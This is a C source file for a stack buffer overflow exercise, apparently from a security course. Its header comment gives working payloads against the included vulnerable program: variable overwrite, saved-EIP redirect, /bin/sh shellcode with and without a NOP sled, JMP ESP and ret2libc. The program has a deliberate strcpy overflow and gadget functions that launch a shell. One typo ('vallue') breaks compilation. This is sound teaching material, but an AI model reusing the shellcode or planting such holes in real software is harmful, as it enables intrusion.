/* 
Author: Gabriel Maciá

***** Preparation for execution: 
 Disable ASLR: 
   sudo su
   echo 0 > /proc/sys/kernel/randomize_va_space

***** EXERCISES: 

1) Execute the function success: 
   Change the value of the variable "value" to 3: 
	   ./vuln `perl -e 'print "A"x500 . "\x03"'`

2) Execute the function success2
   - Find the value of the pointer to the function success2: 
		   (gdb) print success2
		   $1 = {int ()} 0x8049325 <success2>0x8049325
           
   - Find the position of the Saved EIP with gdb --> offset of 516 bytes
   - Overflow the Saved EIP.
   
	   ./vuln `perl -e 'print "A"x500 . "B"x16 . "\x25\x93\x04\x08"'`

3) Execute a shellcode that launches /bin/sh:

   Shellcode (25 bytes):
	   execve ("/bin/sh", ["/bin/sh"], 0)
	   "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
       
   Without NOP Sled
	   ./vuln `perl -e 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x475 . "\x03" . "B"x15 . "\xc8\xcf\xff\xff" '`  

   With NOP Sled
	   ./vuln `perl -e 'print "\x90"x70 . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x405 . "\x03" . "B"x15 . "\xc8\xcf\xff\xff" '`'

5) JMP ESP technique:  www.exploit-db.com/papers/13232
   Avoids having to know the exact position of the buffer. It is similar to the previous one, but in this case we write the payload after the savedEIP and in the savedEIP we call a JMP $ESP instruction.
       
   root@kali:~/# sudo apt install framework2
		root@kali:~/# /usr/share/framework2/msfelfscan -f ./vuln -j esp
		0x08049461   jmp esp
		 
	A veces no se encuentra esta instruccion, pero se puede encontrar entrelazada en otras instrucciones, dado que jmp $esp es \xff\xe4
	
	La explotación se consigue entonces asi: 
	
		./vuln `perl -e 'print "A"x500 . "B"x16 . "\x61\x94\x04\x08" . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`

6) ret2libc technique. 
Compile with NX and test the previous exploits to see that they do not execute.
	# ./compile vuln_stack.c nx 
	# mv vuln_stack vuln_stack_nx
	# rm vuln
	# ln -s vuln_stack_nx vuln

Then, we use the ret2libc technique (explained in class).

	(gdb) p system  (note: first set a breakpoint at main and run to load libc)
	$1 = {<text variable, no debug info>} 0xf7e0ab30 <system>
	(gdb) find &system,+9999999,"/bin/sh"
	0xf7f4aaaa
	warning: Unable to access 16000 bytes of target memory at 0xf7faa6b2, halting search.
	1 pattern found.

With PEDA, you can do:
	gdb-peda$ searchmem "/bin/sh" 
	Searching for '/bin/sh' in: None ranges
	Found 1 results, display max 1 items:
	libc : 0xf7f52f68 ("/bin/sh")


Results obtained: 
	system:  0xf7e0ab30
	/bin/sh: 0xf7f4aaaa  

Payload to execute: 
	./vuln `perl -e 'print "A"x500 . "B"x16 . "\x30\xab\xe0\xf7" . "AAAA" . "\xaa\xaa\xf4\xf7"'`

Now, we also include the exit function in the return to avoid segmentation fault:
	exit: 0xf7dfdb30

	./vuln `perl -e 'print "A"x500 . "B"x16 . "\x30\xab\xe0\xf7" . "\x30\xdb\xdf\xf7" . "\xaa\xaa\xf4\xf7"'`

5) ROP Technique: 
With this technique, /bin/bash will be executed using the functions present in the executable that are not used. They will be executed in a chained manner. See the script rop.py for the solution.
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void callit (char *name);
int success();
int success2();

int main (int argc, char **argv) {


	if (argc < 2) {
		printf ("Usage: %s <name>\n\n", argv[0]);
		exit(0);
	}

	callit(argv[1]);
}

void callit (char *name) {
	int value;
	char buffer[500];
	
	vallue = 0;	
	strcpy (buffer, name);
	printf ("-------------------\n");
	printf ("Value : \t%p [%d]\n", &value, value);	
	printf ("Buffer in: \t%p\n", buffer);
	printf ("Address of function success2: %p\n", success2); 	
	printf ("-------------------\n");
	if (value==3) {
		 success();
	}
	else {
		printf ("[!] No success\n"); 
	}
	value = 0; 
}

int success () {

	printf ("\n--------------------------------------\n");
	printf ("[+] SUCCESS!!!\n");
	printf ("\n--------------------------------------\n");
	
}

int success2 () {

	printf ("\n--------------------------------------\n");
	printf ("[+] WOOOOO!!!");
	printf ("\n--------------------------------------\n");
	
}

// Functions for ROPPING!!

char string[100];

void exec_string() {
  system("printf \"[+] YOU ARE A MEGACRACK\n[+] Starting a bash for you...\""); 
  system(string);
}

void add_bin(int magic) {
  if (magic == 0xdeadbeef) {
    strcat(string, "/bin");
  }
}

void add_bash(int magic1, int magic2) {
  if (magic1 == 0xcafebabe && magic2 == 0x0badf00d) {
    strcat(string, "/bash");
  }
}

// Function to ensure the code contains a jump to ESP (JMP ESP technique)
void jmpesp() {
	__asm__("jmp *%esp");
}

